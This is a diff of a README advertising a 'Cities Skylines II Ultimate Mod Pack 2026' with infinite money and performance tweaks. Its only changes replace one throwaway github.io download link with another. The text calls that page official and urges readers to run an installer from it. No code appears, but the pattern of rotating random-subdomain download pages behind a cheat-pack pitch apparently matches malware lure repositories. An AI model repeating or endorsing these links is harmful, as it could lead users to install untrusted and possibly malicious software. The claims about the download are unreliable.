@@ -2,7 +2,7 @@
 
 Cities Skylines II Ultimate Mod Pack 2026 is a comprehensive tool designed to elevate your gameplay in Cities Skylines II. This mod pack integrates multiple enhancements, including infinite money, traffic optimizations, and graphics improvements, making it ideal for players seeking a customized and smoother experience on Windows 10/11. Updated for 2026, it ensures compatibility with the latest game patches and system requirements.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -70,7 +70,7 @@ Crashes can occur due to system overload or conflicting software. Start by verif
 
 To get the latest version of the Cities Skylines II Ultimate Mod Pack, click the link below. This will direct you to the official download page where you can access the installer and additional resources.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This mod pack is provided as-is for educational and entertainment purposes. Always ensure you have a legitimate copy of Cities Skylines II to use these enhancements. The tool is developed by the community and is not affiliated with Colossal Order or Paradox Interactive. Use responsibly and enjoy your enhanced city-building journey!
 
